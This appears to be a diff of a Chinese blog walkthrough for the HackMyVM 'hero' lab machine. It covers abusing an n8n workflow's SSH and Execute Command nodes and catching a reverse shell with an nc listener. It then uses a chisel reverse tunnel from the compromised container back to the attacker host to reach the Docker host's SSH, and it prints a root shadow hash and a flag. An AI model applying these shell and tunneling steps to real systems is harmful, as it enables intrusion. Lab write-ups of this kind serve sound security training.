@@ -1,7 +1,9 @@
 ---
-{"dg-publish":true,"dg-path":"安全/靶机/hackmyvm_hero.md","permalink":"/安全/靶机/hackmyvm_hero/","title":"hackmyvm_hero","tags":["blog"]}
+{"dg-publish":true,"title":"hackmyvm_hero","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_hero.md","permalink":"/安全/靶机/hackmyvm_hero/","dgPassFrontmatter":true}
 ---
 
+```table-of-contents
+```
 # 主机发现
 
 ```sh
@@ -53,11 +55,19 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C
 运行的是一个N8N 的服务
 https://github.com/n8n-io/n8n
 
-![[YA}A5$$DBT(~4HO5O8F%]YX.png]]
+---
+在 Overview 里面找到 Credentials ，新增 shawa 账号和刚才的 key 。  
+IP 注意不能是 localhost 或者 127.0.0.1 ，因为是 Docker 里。
+提示你 Connection tested successfully 就行了。
+在 Workflow 里面创建一个 Workflow ，弄个手动的 Trigger。 第二个节点选 SSH 
+就可以 Test 命令了。
+
+---
+
 这里是大佬给的思路
 
 我在配置凭证的时候一直不成功，然后重装了一遍靶机就好了
-![[NB`YJYSETZMO%J2(DIJUUJ.png](/img/user/picture/%5BNB%60YJYSETZMO%25J2(DIJUUJ.png)
+![NB`YJYSETZMO%J2(DIJUUJ.png](/img/user/picture/NB%60YJYSETZMO%25J2(DIJUUJ.png)
 
 
 ![Pasted image 20250208092934.png](/img/user/picture/Pasted%20image%2020250208092934.png)
@@ -187,6 +197,93 @@ root@localhost's password:
 ```txt
 HMVNOTINPRODLOL
 ```
+
+
+# 补
+
+如果一开始是使用的Execute Command这个模块进行的反弹shell
+那么是不需要配置凭证的，但是获得的shell是在dockers中
+```sh
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [192.168.124.27] from (UNKNOWN) [192.168.124.30] 33421
+id
+uid=1000(node) gid=1000(node) groups=1000(node)
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+```
+
+首先把chishel工具上传上去
+https://github.com/jpillora/chisel/releases
+
+首先在本机执行：
+```sh
+┌──(root㉿kali)-[~/sharedir]
+└─# ./chisel server -p 2025 --reverse
+2025/02/08 05:08:01 server: Reverse tunnelling enabled
+2025/02/08 05:08:01 server: Fingerprint g2Y54AZXMGOk5s+SFgpOtrSCfUOQ383VgB0MXoeNlRk=
+2025/02/08 05:08:01 server: Listening on http://0.0.0.0:2025
+
+```
+
+
+
+在靶机中执行：
+```sh
+./chisel client 192.168.124.27:2025 R:2222:172.17.0.1:22 &
+```
+
+出现这个提示
+![Pasted image 20250208181230.png](/img/user/picture/Pasted%20image%2020250208181230.png)
+
+```sh
+┌──(root㉿kali)-[~/workspace/pentest/hero]
+└─# ssh -i id2 -p 2222 shawa@192.168.124.27
+The authenticity of host '[192.168.124.27]:2222 ([192.168.124.27]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:4: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.124.27]:2222' (ED25519) to the list of known hosts.
+//这里会显示banner内容
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+hero:~$id
+uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)
+
+```
+
+
+```txt
+root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::
+
+
+root:x:0:0:root:/root:/bin/sh
+```
+
+
+
+
+
+
 
 
 
